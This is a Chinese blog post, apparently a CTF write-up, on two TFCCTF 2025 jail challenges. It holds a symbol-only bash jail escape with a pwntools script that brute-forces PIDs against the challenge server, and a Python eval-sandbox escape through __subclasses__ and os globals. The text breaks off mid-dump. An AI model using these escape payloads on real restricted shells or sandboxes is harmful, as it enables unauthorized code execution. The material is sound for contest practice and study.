+++
title= "TFCCTF2025中两道有趣的jail"
slug= "tfcctf-2025-two-interesting-jails"
description= "很好，使我头脑旋转"
date= "2025-08-30T00:47:47+08:00"
lastmod= "2025-08-30T00:47:47+08:00"
image= ""
license= ""
categories= ["赛题"]
tags= ["jail"]

+++

## MINIJAIL（27solves）

三血  By mingzu&&baozongwi

```dockerfile
FROM ubuntu:20.04

ENV DEBIAN_FRONTEND=noninteractive

RUN apt-get update \
 && apt-get install -y --no-install-recommends bash socat \
 && rm -rf /var/lib/apt/lists/*

WORKDIR /app

COPY yo_mama .
COPY flag.txt /tmp/flag.txt
RUN random_file=$(mktemp /flag.XXXXXX) && mv /tmp/flag.txt "$random_file"

RUN chmod +x yo_mama

ENTRYPOINT ["socat", "TCP-LISTEN:4444,reuseaddr,fork", "EXEC:./yo_mama yooooooo_mama_test,pty,stderr"]
```

先看到Dockerfile里面有个奇怪的启动项，看`yo_mama`这个程序

```bash
#!/bin/bash

goog='^[$>_=:!(){}]+$'

while true; do
    echo -n "caca$ "
    stty -echo
    read -r mine
    stty echo
    echo

    if [[ $mine =~ $goog ]]; then
        eval "$mine"
    else
        echo '[!] Error: forbidden characters detected'
        printf '\n'
    fi
done
```

看到白名单，很有php无字母参数RCE那个味道，只要满足就`eval`执行，最重要的就是0和1，再切片就可以了

取 `$1` 和 `$_`：

```bash
_=$((!_____))
__=${!_}
___=$_
```

 `__` 应该是 `yooooooo_mama_test`，

```bash
${___}$($_)${__}
```

现在开始**每次左移一个字符**，直到你看到打印出来的串**以 `s` 开头**为止（也就是变成 `s` 后面一堆字母）。左移一格的命令是：

```bash
__=${__:$((!_____))}
```

左移一次就再执行一次上面的“打印”命令：

```bash
${___}$($_)${__}
```

- 重复“左移 → 打印 → 左移 → 打印”，直到打印出来的第一字符是 `s`（大概要按很多次，不用数，看到开头是 `s` 就行）。把这个**首字符**（也就是 `s`）单独取出来存到变量里：

```bash
____=${__:$((________)):$((!_____))}
```

处理 `___`（它现在是 `echo`），左移两次得到以 `h` 开头：

```bash
___=${___:$((!_____))}
___=${___:$((!_____))}
```

现在是`ho`，取出这个 `h`：

```bash
_____=${___:$((________)):$((!_____))}
______=${____}${_____}
$______
```

其实`$_____`就已经是h，但是为了后面不重复键，所以移动到了`$______`，再构造`s`，最初的`yooooooo_mama_test`也就是`$1`的第十六位为`s`，通过爆破偏移PID来获得16从而构造出s，但是这样子PID是有局限性的，所以写脚本要限制一下，最终exp如下

```python
from pwn import *

context.log_level = "debug"

targets = [16<<i for i in range(5)]

hsteps = [
    "_=$((!_____))",
    "__=${!_}",
    "___=$_",
    "${___}$($_)${__}",
    "__=${__:$((!_____))}",
    "${___}$($_)${__}",
    "____=${__:$((________)):$((!_____))}",
    "___=${___:$((!_____))}",
    "___=${___:$((!_____))}",
    "_____=${___:$((________)):$((!_____))}",
    "______=${____}${_____}",
    "$______"
]

ssteps1 = [
    "__=$(())",
    "__=$((!$__))",
    "____=$(($$))"
]

ssteps2 = [
    "_____=${!__:____:__}",
    "$_____",
    "$_____$______"
]


while True:
    #p = remote("127.0.0.1", 4444)
    """
    ncat --ssl minijail-1845e80796387fe2.challs.tfcctf.com 1337
    """
    p = remote("minijail-1845e80796387fe2.challs.tfcctf.com", 1337, ssl=True)
    p.recvuntil(b"caca$")
    p.sendline(b"$(($$))")
    n = p.recvuntil(b"command not found")
    n = n.decode().split(':')[2].strip()
    n = int(n)
    if n > max(targets):
        exit(0)
    elif n in targets:
        for step in hsteps:
            p.recvuntil(b"caca$")
            p.sendline(step.encode())

        x = targets.index(n)
        for step in ssteps1:
            p.recvuntil(b"caca$")
            p.sendline(step.encode())

        for i in range(x):
            p.recvuntil(b"caca$")
            p.sendline(b"____=$(($____>>$__))")

        for step in ssteps2:
            p.recvuntil(b"caca$")
            p.sendline(step.encode())

        p.interactive()
        exit(0)
    print(f"Number: {n}")
    p.close()
```

但是由于变量设置，所以一个靶机只能进攻一次，失败就得从来

## ΠJAIL（10solves）

baozongwi&&A5rz

```python
from concurrent import interpreters
import threading
import ctypes, pwd
import os

os.setgroups([])
os.setgid(pwd.getpwnam("nobody").pw_gid)

INPUT = None

def safe_eval(user_input):
    safe_builtins = {}

    blacklist = ['os', 'system', 'subprocess', 'compile', 'code', 'chr', 'str', 'bytes']
    if any(b in user_input for b in blacklist):
        print("Blacklisted function detected.")
        return False
    if any(ord(c) < 32 or ord(c) > 126 for c in user_input):
        print("Invalid characters detected.")
        return False

    success = True

    try:
        print("Result:", eval(user_input, {"__builtins__": safe_builtins}, {"__builtins__": safe_builtins}))
    except:
        success = False

    return success

def safe_user_input():
    global INPUT
    # drop priv level
    libc = ctypes.CDLL(None)
    syscall = libc.syscall
    nobody_uid = pwd.getpwnam("nobody").pw_uid
    SYS_setresuid = 117
    syscall(SYS_setresuid, nobody_uid, nobody_uid, nobody_uid)

    try:
        user_interpreter = interpreters.create()
        INPUT = input("Enter payload: ")
        user_interpreter.call(safe_eval, INPUT)
        user_interpreter.close()
    except:
        pass

while True:
    try:
        t = threading.Thread(target=safe_user_input)
        t.start()
        t.join()
        
        if INPUT == "exit":
            break
    except:
        print("Some error occured")
        break

```

使用 **Python 3.14** 的新特性 **多重解释器**（`concurrent.interpreters`），在沙箱中执行用户输入代码。过了一些关键词，以及`__builtins__`被清空，所以很多的内置函数都不能使用，而且还被降权了，

先把所有打印出来

```bash
().__class__.__base__.__subclasses__()

Result: [<class 'type'>, <class 'async_generator'>, <class 'bytearray_iterator'>, <class 'bytearray'>, <class 'bytes_iterator'>, <class 'bytes'>, <class 'builtin_function_or_method'>, <class 'callable_iterator'>, <class 'PyCapsule'>, <class 'cell'>, <class 'classmethod_descriptor'>, <class 'classmethod'>, <class 'code'>, <class 'complex'>, <class '_contextvars.Token'>, <class '_contextvars.ContextVar'>, <class '_contextvars.Context'>, <class 'coroutine'>, <class 'dict_items'>, <class 'dict_itemiterator'>, <class 'dict_keyiterator'>, <class 'dict_valueiterator'>, <class 'dict_keys'>, <class 'mappingproxy'>, <class 'dict_reverseitemiterator'>, <class 'dict_reversekeyiterator'>, <class 'dict_reversevalueiterator'>, <class 'dict_values'>, <class 'dict'>, <class 'ellipsis'>, <class 'enumerate'>, <class 'filter'>, <class 'float'>, <class 'frame'>, <class 'FrameLocalsProxy'>, <class 'frozenset'>, <class 'function'>, <class 'generator'>, <class 'getset_descriptor'>, <class 'instancemethod'>, <class 'list_iterator'>, <class 'list_reverseiterator'>, <class 'list'>, <class 'longrange_iterator'>, <class 'int'>, <class 'map'>, <class 'member_descriptor'>, <class 'memoryview'>, <class 'method_descriptor'>, <class 'method'>, <class 'moduledef'>, <class 'module'>, <class 'odict_iterator'>, <class 'pickle.PickleBuffer'>, <class 'property'>, <class 'range_iterator'>, <class 'range'>, <class 'reversed'>, <class 'symtable entry'>, <class 'iterator'>, <class 'set_iterator'>, <class 'set'>, <class 'slice'>, <class 'staticmethod'>, <class 'stderrprinter'>, <class 'super'>, <class 'traceback'>, <class 'tuple_iterator'>, <class 'tuple'>, <class 'str_iterator'>, <class 'str'>, <class 'wrapper_descriptor'>, <class 'zip'>, <class 'types.GenericAlias'>, <class 'anext_awaitable'>, <class 'async_generator_asend'>, <class 'async_generator_athrow'>, <class 'async_generator_wrapped_value'>, <class '_buffer_wrapper'>, <class 'Token.MISSING'>, <class 'coroutine_wrapper'>, <class 'generic_alias_iterator'>, <class 'items'>, <class 'keys'>, <class 'values'>, <class 'hamt_array_node'>, <class 'hamt_bitmap_node'>, <class 'hamt_collision_node'>, <class 'hamt'>, <class 'InstructionSequence'>, <class 'string.templatelib.Interpolation'>, <class 'sys.legacy_event_handler'>, <class 'line_iterator'>, <class 'managedbuffer'>, <class 'memory_iterator'>, <class 'method-wrapper'>, <class 'types.SimpleNamespace'>, <class 'NoneType'>, <class 'NotImplementedType'>, <class 'positions_iterator'>, <class 'string.templatelib.Template'>, <class 'string.templatelib.TemplateIter'>, <class 'str_ascii_iterator'>, <class 'typing.Union'>, <class 'weakref.CallableProxyType'>, <class 'weakref.ProxyType'>, <class 'weakref.ReferenceType'>, <class 'typing.TypeAliasType'>, <class 'NoDefaultType'>, <class 'typing.Generic'>, <class 'typing.TypeVar'>, <class 'typing.TypeVarTuple'>, <class 'typing.ParamSpec'>, <class 'typing.ParamSpecArgs'>, <class 'typing.ParamSpecKwargs'>, <class '_typing._ConstEvaluator'>, <class 'EncodingMap'>, <class 'fieldnameiterator'>, <class 'formatteriterator'>, <class 'BaseException'>, <class 'datetime.date'>, <class 'datetime.time'>, <class 'datetime.timedelta'>, <class 'datetime.tzinfo'>, <class '_frozen_importlib._WeakValueDictionary'>, <class '_frozen_importlib._BlockingOnManager'>, <class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib.BuiltinImporter'>, <class '_frozen_importlib.FrozenImporter'>, <class '_frozen_importlib._ImportLockContext'>, <class '_thread._ThreadHandle'>, <class '_thread.lock'>, <class '_thread.RLock'>, <class '_thread._localdummy'>, <class '_thread._local'>, <class '_io.IncrementalNewlineDecoder'>, <class '_io._BytesIOBuffer'>, <class '_io._IOBase'>, <class 'posix.ScandirIterator'>, <class 'posix.DirEntry'>, <class '_frozen_importlib_external.WindowsRegistryFinder'>, <class '_frozen_importlib_external._LoaderBasics'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external.NamespaceLoader'>, <class '_frozen_importlib_external.PathFinder'>, <class '_frozen_importlib_external.FileFinder'>, <class 'codecs.Codec'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class '_abc._abc_data'>, <class 'abc.ABC'>, <class 'collections.abc.Hashable'>, <class 'collections.abc.Awaitable'>, <class 'collections.abc.AsyncIterable'>, <class 'collections.abc.Iterable'>, <class 'collections.abc.Sized'>, <class 'collections.abc.Container'>, <class 'collections.abc.Buffer'>, <class 'collections.abc.Callable'>, <class 'genericpath.ALLOW_MISSING'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class '_sitebuiltins._Helper'>]
```

看到了老朋友`os._wrap_close`

```
().__class__.__base__.__subclasses__()[166]
<class 'os._wrap_close'>

().__class__.__base__.__subclasses__()[166].__init__.__globals__
Result: {'__name__': 'os', '__doc__': "OS routines for NT or Posix depending on what system we're on.\n\nThis exports:\n  - all functions from posix or nt, e.g. unlink, stat, etc.\n  - os.path is either posixpath or ntpath\n  - os.name is either 'posix' or 'nt'\n  - os.curdir is a string representing the current directory (always '.')\n  - os.pardir is a string representing the parent directory (always '..')\n  - os.sep is the (or a most common) pathname separator ('/' or '\\\\')\n  - os.extsep is the extension separator (always '.')\n  - os.altsep is the alternate pathname separator (None or '/')\n  - os.pathsep is the component separator used in $PATH etc\n  - os.linesep is the line separator in text files ('\\n' or '\\r\\n')\n  - os.defpath is the default search path for executables\n  - os.devnull is the file path of the null device ('/dev/null', etc.)\n\nPrograms that import and use 'os' stand a better chance of being\nportable between different platforms.  Of course, they must then\nonly use functions that are defined by all platforms (e.g., unlink\nand opendir), and leave all pathname manipulation to os.path\n(e.g., split and join).\n", '__package__': '', '__loader__': <class '_frozen_importlib.FrozenImporter'>, '__spec__': ModuleSpec(name='os', loader=<class '_frozen_importlib.FrozenImporter'>, origin='frozen'), '__file__': '/usr/local/lib/python3.14/os.py', '__builtins__': {'__name__': 'builtins', '__doc__': "Built-in functions, types, exceptions, and other objects.\n\nThis module provides direct access to all 'built-in'\nidentifiers of Python; for example, builtins.len is\nthe full name for the built-in function len().\n\nThis module is not normally accessed explicitly by most\napplications, but can be useful in modules that provide\nobjects with the same name as a built-in value, but in\nwhich the built-in of that name is also needed.", '__package__': '', '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': ModuleSpec(name='builtins', loader=<class '_frozen_importlib.BuiltinImporter'>, origin='built-in'), '__build_class__': <built-in function __build_class__>, '__import__': <built-in function __import__>, 'abs': <built-in function abs>, 'all': <built-in function all>, 'any': <built-in function any>, 'ascii': <built-in function ascii>, 'bin': <built-in function bin>, 'breakpoint': <built-in function breakpoint>, 'callable': <built-in function callable>, 'chr': <built-in function chr>, 'compile': <built-in function compile>, 'delattr': <built-in function delattr>, 'dir': <built-in function dir>, 'divmod': <built-in function divmod>, 'eval': <built-in function eval>, 'exec': <built-in function >, 'format': <built-in function format>, 'getattr': <built-in function getattr>, 'globals': <built-in function globals>, 'hasattr': <built-in function hasattr>, 'hash': <built-in function hash>, 'hex': <built-in function hex>, 'id': <built-in function id>, 'input': <built-in function input>, 'isinstance': <built-in function isinstance>, 'issubclass': <built-in function issubclass>, 'iter': <built-in function iter>, 'aiter': <built-in function aiter>, 'len': <built-in function len>, 'locals': <built-in function locals>, 'max': <built-in function max>, 'min': <built-in function min>, 'next': <built-in function next>, 'anext': <built-in function anext>, 'oct': <built-in function oct>, 'ord': <built-in function ord>, 'pow': <built-in function pow>, 'print': <built-in function print>, 'repr': <built-in function repr>, 'round': <built-in function round>, 'setattr': <built-in function setattr>, 'sorted': <built-in function sorted>, 'sum': <built-in function sum>, 'vars': <built-in function vars>, 'None': None, 'Ellipsis': Ellipsis, 'NotImplemented': NotImplemented, 'False': False, 'True': True, 'bool': <class 'bool'>, 'memoryview': <class 'memoryview'>, 'bytearray': <class 'bytearray'>, 'bytes': <class 'bytes'>, 'classmethod': <class 'classmethod'>, 'complex': <class 'complex'>, 'dict': <class 'dict'>, 'enumerate': <class 'enumerate'>, 'filter': <class 'filter'>, 'float': <class 'float'>, 'frozenset': <class 'frozenset'>, 'property': <class 'property'>, 'int': <class 'int'>, 'list': <class 'list'>, 'map': <class 'map'>, 'object': <class 'object'>, 'range': <class 'range'>, 'reversed': <class 'reversed'>, 'set': <class 'set'>, 'slice': <class 'slice'>, 'staticmethod': <class 'staticmethod'>, 'str': <class 'str'>, 'super': <class 'super'>, 'tuple': <class 'tuple'>, 'type': <class 'type'>, 'zip': <class 'zip'>, '__debug__': True, 'BaseException': <class 'BaseException'>, 'BaseExceptionGroup': <class 'BaseExceptionGroup'>, 'Exception': <class 'Exception'>, 'GeneratorExit': <class 'GeneratorExit'>, 'KeyboardInterrupt': <class 'KeyboardInterrupt'>, 'SystemExit': <class 'SystemExit'>, 'ArithmeticError': <class 'ArithmeticError'>, 'AssertionError': <class 'AssertionError'>, 'AttributeError': <class 'AttributeError'>, 'BufferError': <class 'BufferError'>, 'EOFError': <class 'EOFError'>, 'ImportError': <class 'ImportError'>, 'LookupError': <class 'LookupError'>, 'MemoryError': <class 'MemoryError'>, 'NameError': <class 'NameError'>, 'OSError': <class 'OSError'>, 'ReferenceError': <class 'ReferenceError'>, 'RuntimeError': <class 'RuntimeError'>, 'StopAsyncIteration': <class 'StopAsyncIteration'>, 'StopIteration': <class 'StopIteration'>, 'SyntaxError': <class 'SyntaxError'>, 'SystemError': <class 'SystemError'>, 'TypeError': <class 'TypeError'>, 'ValueError': <class 'ValueError'>, 'Warning': <class 'Warning'>, 'FloatingPointError': <class 'FloatingPointError'>, 'OverflowError': <class 'OverflowError'>, 'ZeroDivisionError': <class 'ZeroDivisionError'>, 'BytesWarning': <class 'BytesWarning'>, 'DeprecationWarning': <class 'DeprecationWarning'>, 'EncodingWarning': <class 'EncodingWarning'>, 'FutureWarning': <class 'FutureWarning'>, 'ImportWarning': <class 'ImportWarning'>, 'PendingDeprecationWarning': <class 'PendingDeprecationWarning'>, 'ResourceWarning': <class 'ResourceWarning'>, 'RuntimeWarning': <class 'RuntimeWarning'>, 'SyntaxWarning': <class 'SyntaxWarning'>, 'UnicodeWarning': <class 'UnicodeWarning'>, 'UserWarning': <class 'UserWarning'>, 'BlockingIOError': <class 'BlockingIOError'>, 'ChildProcessError': <class 'ChildProcessError'>, 'ConnectionError': <class 'ConnectionError'>, 'FileExistsError': <class 'FileExistsError'>, 'FileNotFoundError': <class 'FileNotFoundError'>, 'InterruptedError': <class 'InterruptedError'>, 'IsADirectoryError': <class 'IsADirectoryError'>, 'NotADirectoryError': <class 'NotADirectoryError'>, 'PermissionError': <class 'PermissionError'>, 'ProcessLookupError': <class 'ProcessLookupError'>, 'TimeoutError': <class 'TimeoutError'>, 'IndentationError': <class 'IndentationError'>, '_IncompleteInputError': <class '_IncompleteInputError'>, 'IndexError': <class 'IndexError'>, 'KeyError': <class 'KeyError'>, 'ModuleNotFoundError': <class 'ModuleNotFoundError'>, 'NotImplementedError': <class 'NotImplementedError'>, 'PythonFinalizationError': <class 'PythonFinalizationError'>, 'RecursionError': <class 'RecursionError'>, 'UnboundLocalError': <class 'UnboundLocalError'>, 'UnicodeError': <class 'UnicodeError'>, 'BrokenPipeError': <class 'BrokenPipeError'>, 'ConnectionAbortedError': <class 'ConnectionAbortedError'>, 'ConnectionRefusedError': <class 'ConnectionRefusedError'>, 'ConnectionResetError': <class 'ConnectionResetError'>, 'TabError': <class 'TabError'>, 'UnicodeDecodeError': <class 'UnicodeDecodeError'>, 'UnicodeEncodeError': <class 'UnicodeEncodeError'>, 'UnicodeTranslateError': <class 'UnicodeTranslateError'>, 'ExceptionGroup': <class 'ExceptionGroup'>, 'EnvironmentError': <class 'OSError'>, 'IOError': <class 'OSError'>, 'open': <built-in function open>, 'quit': Use quit() or Ctrl-D (i.e. EOF) to exit, 'exit': Use exit() or Ctrl-D (i.e. EOF) to exit, 'copyright': Copyright (c) 2001 Python Software Foundation.
All Rights Reserved.

Copyright (c) 2000 BeOpen.com.
All Rights Reserved.

Copyright (c) 1995-2001 Corporation for National Research Initiatives.
All Rights Reserved.

Copyright (c) 1991-1995 Stichting Mathematisch Centrum, Amsterdam.
All Rights Reserved., 'credits':     Thanks to CWI, CNRI, BeOpen, Zope Corporation, the Python Software
    Foundation, and a cast of thousands for supporting Python
    development.  See www.python.org for more information., 'license': Type license() to see the full license text, 'help': Type help() for interactive help, or help(object) for help about object.}, 'abc': <module 'abc' (frozen)>, 'sys': <module 'sys' (built-in)>, 'st': <module 'stat' (frozen)>, '_check_methods': <function _check_methods at 0x739e99b50d50>, 'GenericAlias': <class 'types.GenericAlias'>, '__all__': ['altsep', 'curdir', 'pardir', 'sep', 'pathsep', 'linesep', 'defpath', 'name', 'path', 'devnull', 'SEEK_SET', 'SEEK_CUR', 'SEEK_END', 'fsencode', 'fsdecode', 'get_exec_path', 'fdopen', 'extsep', '_exit', 'CLD_CONTINUED', 'CLD_DUMPED', 'CLD_EXITED', 'CLD_KILLED', 'CLD_STOPPED', 'CLD_TRAPPED', 'CLONE_FILES', 'CLONE_FS', 'CLONE_NEWCGROUP', 'CLONE_NEWIPC', 'CLONE_NEWNET', 'CLONE_NEWNS', 'CLONE_NEWPID', 'CLONE_NEWTIME', 'CLONE_NEWUSER', 'CLONE_NEWUTS', 'CLONE_SIGHAND', 'CLONE_SYSVSEM', 'CLONE_THREAD', 'CLONE_VM', 'DirEntry', 'EFD_CLOEXEC', 'EFD_NONBLOCK', 'EFD_SEMAPHORE', 'EX_CANTCREAT', 'EX_CONFIG', 'EX_DATAERR', 'EX_IOERR', 'EX_NOHOST', 'EX_NOINPUT', 'EX_NOPERM', 'EX_NOUSER', 'EX_OK', 'EX_OSERR', 'EX_OSFILE', 'EX_PROTOCOL', 'EX_SOFTWARE', 'EX_TEMPFAIL', 'EX_UNAVAILABLE', 'EX_USAGE', 'F_LOCK', 'F_OK', 'F_TEST', 'F_TLOCK', 'F_ULOCK', 'GRND_NONBLOCK', 'GRND_RANDOM', 'MFD_ALLOW_SEALING', 'MFD_CLOEXEC', 'MFD_HUGETLB', 'MFD_HUGE_16GB', 'MFD_HUGE_16MB', 'MFD_HUGE_1GB', 'MFD_HUGE_1MB', 'MFD_HUGE_256MB', 'MFD_HUGE_2GB', 'MFD_HUGE_2MB', 'MFD_HUGE_32MB', 'MFD_HUGE_512KB', 'MFD_HUGE_512MB', 'MFD_HUGE_64KB', 'MFD_HUGE_8MB', 'MFD_HUGE_MASK', 'MFD_HUGE_SHIFT', 'NGROUPS_MAX', 'O_ACCMODE', 'O_APPEND', 'O_ASYNC', 'O_CLOEXEC', 'O_CREAT', 'O_DIRECT', 'O_DIRECTORY', 'O_DSYNC', 'O_EXCL', 'O_FSYNC', 'O_LARGEFILE', 'O_NDELAY', 'O_NOATIME', 'O_NOCTTY', 'O_NOFOLLOW', 'O_NONBLOCK', 'O_PATH', 'O_RDONLY', 'O_RDWR', 'O_RSYNC', 'O_SYNC', 'O_TMPFILE', 'O_TRUNC', 'O_WRONLY', 'PIDFD_NONBLOCK', 'POSIX_FADV_DONTNEED', 'POSIX_FADV_NOREUSE', 'POSIX_FADV_NORMAL', 'POSIX_FADV_RANDOM', 'POSIX_FADV_SEQUENTIAL', 'POSIX_FADV_WILLNEED', 'POSIX_SPAWN_CLOSE', 'POSIX_SPAWN_CLOSEFROM', 'POSIX_SPAWN_DUP2', 'POSIX_SPAWN_OPEN', 'PRIO_PGRP', 'PRIO_PROCESS', 'PRIO_USER', 'P_ALL', 'P_PGID', 'P_PID', 'P_PIDFD', 'RTLD_DEEPBIND', 'RTLD_GLOBAL', 'RTLD_LAZY', 'RTLD_LOCAL', 'RTLD_NODELETE', 'RTLD_NOLOAD', 'RTLD_NOW', 'RWF_APPEND', 'RWF_DSYNC', 'RWF_HIPRI', 'RWF_NOWAIT', 'RWF_SYNC', 'R_OK', 'SCHED_BATCH', 'SCHED_DEADLINE', 'SCHED_FIFO', 'SCHED_IDLE', 'SCHED_NORMAL', 'SCHED_OTHER', 'SCHED_RESET_ON_FORK', 'SCHED_RR', 'SEEK_DATA', 'SEEK_HOLE', 'SPLICE_F_MORE', 'SPLICE_F_MOVE', 'SPLICE_F_NONBLOCK', 'ST_APPEND', 'ST_MANDLOCK', 'ST_NOATIME', 'ST_NODEV', 'ST_NODIRATIME', 'ST_NOEXEC', 'ST_NOSUID', 'ST_RDONLY', 'ST_RELATIME', 'ST_SYNCHRONOUS', 'ST_WRITE', 'TFD_CLOEXEC', 'TFD_NONBLOCK', 'TFD_TIMER_ABSTIME', 'TFD_TIMER_CANCEL_ON_SET', 'TMP_MAX', 'WCONTINUED', 'WCOREDUMP', 'WEXITED', 'WEXITSTATUS', 'WIFCONTINUED', 'WIFEXITED', 'WIFSIGNALED', 'WIFSTOPPED', 'WNOHANG', 'WNOWAIT', 'WSTOPPED', 'WSTOPSIG', 'WTERMSIG', 'WUNTRACED', 'W_OK', 'XATTR_CREATE', 'XATTR_REPLACE', 'XATTR_SIZE_MAX', 'X_OK', 'abort', 'access', 'chdir', 'chmod', 'chown', 'chroot', 'close', 'closerange', 'confstr', 'confstr_names', 'copy_file_range', 'cpu_count', 'ctermid', 'device_encoding', 'dup', 'dup2', 'environ', 'error', 'eventfd', 'eventfd_read', 'eventfd_write', 'execv', 'execve', 'fchdir', 'fchmod', 'fchown', 'fdatasync', 'fork', 'forkpty', 'fpathconf', 'fspath', 'fstat', 'fstatvfs', 'fsync', 'ftruncate', 'get_blocking', 'get_inheritable', 'get_terminal_size', 'getcwd', 'getcwdb', 'getegid', 'geteuid', 'getgid', 'getgrouplist', 'getgroups', 'getloadavg', 'getlogin', 'getpgid', 'getpgrp', 'getpid', 'getppid', 'getpriority', 'getrandom', 'getresgid', 'getresuid', 'getsid', 'getuid', 'getxattr', 'grantpt', 'initgroups', 'isatty', 'kill', 'killpg', 'lchown', 'link', 'listdir', 'listxattr', 'lockf', 'login_tty', 'lseek', 'lstat', 'major', 'makedev', 'memfd_create', 'minor', 'mkdir', 'mkfifo', 'mknod', 'nice', 'open', 'openpty', 'pathconf', 'pathconf_names', 'pidfd_open', 'pipe', 'pipe2', 'posix_fadvise', 'posix_fallocate', 'posix_openpt', 'posix_spawn', 'posix_spawnp', 'pread', 'preadv', 'ptsname', 'putenv', 'pwrite', 'pwritev', 'read', 'readinto', 'readlink', 'readv', 'register_at_fork', 'remove', 'removexattr', 'rename', 'replace', 'rmdir', 'scandir', 'sched_get_priority_max', 'sched_get_priority_min', 'sched_getaffinity', 'sched_getparam', 'sched_getscheduler', 'sched_param', 'sched_rr_get_interval', 'sched_setaffinity', 'sched_setparam', 'sched_setscheduler', 'sched_yield', 'sendfile', 'set_blocking', 'set_inheritable', 'setegid', 'seteuid', 'setgid', 'setgroups', 'setns', 'setpgid', 'setpgrp', 'setpriority', 'setregid', 'setresgid', 'setresuid', 'setreuid', 'setsid', 'setuid', 'setxattr', 'splice', 'stat', 'stat_result', 'statvfs', 'statvfs_result', 'strerror', 'symlink', 'sync', 'sysconf', 'sysconf_names', 'system', 'tcgetpgrp', 'tcsetpgrp', 'terminal_size', 'timerfd_create', 'timerfd_gettime', 'timerfd_gettime_ns', 'timerfd_settime', 'timerfd_settime_ns', 'times', 'times_result', 'truncate', 'ttyname', 'umask', 'uname', 'uname_result', 'unlink', 'unlockpt', 'unsetenv', 'unshare', 'urandom', 'utime', 'wait', 'wait3', 'wait4', 'waitid', 'waitid_result', 'waitpid', 'waitstatus_to_exitcode', 'write', 'writev', 'makedirs', 'removedirs', 'renames', 'walk', 'fwalk', 'execl', 'execle', 'execlp', 'execlpe', 'execvp', 'execvpe', 'getenv', 'supports_bytes_environ', 'environb', 'getenvb', 'P_WAIT', 'P_NOWAIT', 'P_NOWAITO', 'spawnv', 'spawnve', 'spawnvp', 'spawnvpe', 'spawnl', 'spawnle', 'spawnlp', 'spawnlpe', 'popen'], '_exists': <function _exists at 0x739e99b27b60>, '_get_exports_list': <function _get_exports_list at 0x739e99b27cc0>, 'name': 'posix', 'linesep': '\n', 'stat': <built-in function stat>, 'access': <built-in function access>, 'ttyname': <built-in function ttyname>, 'chdir': <built-in function chdir>, 'chmod': <built-in function chmod>, 'fchmod': <built-in function fchmod>, 'chown': <built-in function chown>, 'fchown': <built-in function fchown>, 'lchown': <built-in function lchown>, 'chroot': <built-in function chroot>, 'ctermid': <built-in function ctermid>, 'getcwd': <built-in function getcwd>, 'getcwdb': <built-in function getcwdb>, 'link': <built-in function link>, 'listdir': <built-in function listdir>, 'lstat': <built-in function lstat>, 'mkdir': <built-in function mkdir>, 'nice': <built-in function nice>, 'getpriority': <built-in function getpriority>, 'setpriority': <built-in function setpriority>, 'posix_spawn': <built-in function posix_spawn>, 'posix_spawnp': <built-in function posix_spawnp>, 'readlink': <built-in function readlink>, 'copy_file_range': <built-in function copy_file_range>, 'splice': <built-in function splice>, 'rename': <built-in function rename>, 'replace': <built-in function replace>, 'rmdir': <built-in function rmdir>, 'symlink': <built-in function symlink>, 'system': <built-in function system>, 'umask': <built-in function umask>, 'uname': <built-in function uname>, 'unlink': <built-in function unlink>, 'remove': <built-in function remove>, 'utime': <built-in function utime>, 'times': <built-in function times>, 'execv': <built-in function execv>, 'execve': <built-in function execve>, 'fork': <built-in function fork>, 'register_at_fork': <built-in function register_at_fork>, 'sched_get_priority_max': <built-in function sched_get_priority_max>, 'sched_get_priority_min': <built-in function sched_get_priority_min>, 'sched_getparam': <built-in function sched_getparam>, 'sched_getscheduler': <built-in function sched_getscheduler>, 'sched_rr_get_interval': <built-in function sched_rr_get_interval>, 'sched_setparam': <built-in function sched_setparam>, 'sched_setscheduler': <built-in function sched_setscheduler>, 'sched_yield': <built-in function sched_yield>, 'sched_setaffinity': <built-in function sched_setaffinity>, 'sched_getaffinity': <built-in function sched_getaffinity>, 'posix_openpt': <built-in function posix_openpt>, 'grantpt': <built-in function grantpt>, 'unlockpt': <built-in function unlockpt>, 'ptsname': <built-in function ptsname>, 'openpty': <built-in function openpty>, 'login_tty': <built-in function login_tty>, 'forkpty': <built-in function forkpty>, 'getegid': <built-in function getegid>, 'geteuid': <built-in function geteuid>, 'getgid': <built-in function getgid>, 'getgrouplist': <built-in function getgrouplist>, 'getgroups': <built-in function getgroups>, 'getpid': <built-in function getpid>, 'getpgrp': <built-in function getpgrp>, 'getppid': <built-in function getppid>, 'getuid': <built-in function getuid>, 'getlogin': <built-in function getlogin>, 'kill': <built-in function kill>, 'killpg': <built-in function killpg>, 'setuid': <built-in function setuid>, 'seteuid': <built-in function seteuid>, 'setreuid': <built-in function setreuid>, 'setgid': <built-in function setgid>, 'setegid': <built-in function setegid>, 'setregid': <built-in function setregid>, 'setgroups': <built-in function setgroups>, 'initgroups': <built-in function initgroups>, 'getpgid': <built-in function getpgid>, 'setpgrp': <built-in function setpgrp>, 'wait': <built-in function wait>, 'wait3': <built-in function wait3>, 'wait4': <built-in function wait4>, 'waitid': <built-in function waitid>, 'waitpid': <built-in function waitpid>, 'pidfd_open': <built-in function pidfd_open>, 'getsid': <built-in function getsid>, 'setsid': <built-in function setsid>, 'setpgid': <built-in function setpgid>, 'tcgetpgrp': <built-in function tcgetpgrp>, 'tcsetpgrp': <built-in function tcsetpgrp>, 'open': <built-in function open>, 'close': <built-in function close>, 'closerange': <built-in function closerange>, 'device_encoding': <built-in function device_encoding>, 'dup': <built-in function dup>, 'dup2': <built-in function dup2>, 'lockf': <built-in function lockf>, 'lseek': <built-in function lseek>, 'read': <built-in function read>, 'readinto': <built-in function readinto>, 'readv': <built-in function readv>, 'pread': <built-in function pread>, 'preadv': <built-in function preadv>, 'write': <built-in function write>, 'writev': <built-in function writev>, 'pwrite': <built-in function pwrite>, 'pwritev': <built-in function pwritev>, 'sendfile': <built-in function sendfile>, 'fstat': <built-in function fstat>, 'isatty': <built-in function isatty>, 'pipe': <built-in function pipe>, 'pipe2': <built-in function pipe2>, 'mkfifo': <built-in function mkfifo>, 'mknod': <built-in function mknod>, 'major': <built-in function major>, 'minor': <built-in function minor>, 